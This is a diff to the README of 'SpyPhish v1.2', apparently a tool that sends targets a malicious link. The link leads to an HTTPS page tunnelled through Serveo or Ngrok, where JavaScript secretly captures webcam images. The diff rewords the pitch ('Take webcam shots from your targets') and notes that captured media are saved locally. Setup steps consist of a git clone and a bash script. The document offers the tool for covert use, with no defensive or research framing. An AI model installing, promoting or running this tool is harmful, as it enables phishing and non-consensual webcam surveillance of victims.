@@ -1,5 +1,5 @@
 # SpyPhish v1.2
-Take webcam shots from target just sending a malicious link
+Take webcam shots from your targets by just sending a malicious link to them
 
 # How it works?
 <p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia. </p>
@@ -16,4 +16,9 @@ apt update && apt upgrade
 git clone https://github.com/anonymouXnash/SpyPhish
 cd SpyPhish
 bash spyphish.sh
+```
+## NOTE :
+<P>The captured media are stored in SpyPhish folder</p>
+```
+cd SpyPhish
 ```
